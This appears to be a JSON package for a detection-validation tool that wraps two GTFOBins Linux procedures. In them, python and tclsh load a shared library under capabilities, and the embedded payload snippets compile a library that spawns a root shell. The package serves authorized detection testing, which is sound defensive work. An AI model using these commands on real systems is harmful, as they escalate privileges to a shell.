@@ -1,0 +1,175 @@
+{
+  "package_id": "gtfobins-library-load-capabilities-v1",
+  "package_name": "GTFOBins - Library Load / Capabilities",
+  "version": "1.0.0",
+  "summary": "2 source-derived GTFOBins Living-Off-The-Land procedures for library load / Capabilities.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 2 distinct source procedures grouped by library-load / Capabilities.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Library Load",
+  "mitre_tcodes": [
+    "T1574"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 2
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_payload_path",
+          "label": "Payload Path",
+          "description": "Operator-supplied payload path for this authorized LOTL procedure. Source token: /path/to/lib\\.so.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "payload_path"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:python:library-load:0:capabilities::",
+      "name": "GTFOBINS - T1574 - python - Library load - Capabilities [11c831c]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: python. Context: Capabilities.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/python",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/python",
+        "source_bin": "python",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "capabilities",
+        "context_description": "This function is performed bypassing the usual kernel permission checks if the executable has certain capabilities set.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {
+          "list": [
+            "CAP_SETUID"
+          ]
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:python:library-load:0:capabilities::",
+        "source_name": "python",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `python` binary must be installed and available to the executing Agent.",
+          "The required Linux capabilities must already be assigned; Morgana does not configure capabilities."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tclsh:library-load:0:capabilities::",
+      "name": "GTFOBINS - T1574 - tclsh - Library load - Capabilities [4b963f6]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: tclsh. Context: Capabilities.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "tclsh\nload #{lotl_gtfobins_payload_path} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tclsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tclsh",
+        "source_bin": "tclsh",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "capabilities",
+        "context_description": "This function is performed bypassing the usual kernel permission checks if the executable has certain capabilities set.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tclsh:library-load:0:capabilities::",
+        "source_name": "tclsh",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `tclsh` binary must be installed and available to the executing Agent.",
+          "The required Linux capabilities must already be assigned; Morgana does not configure capabilities."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
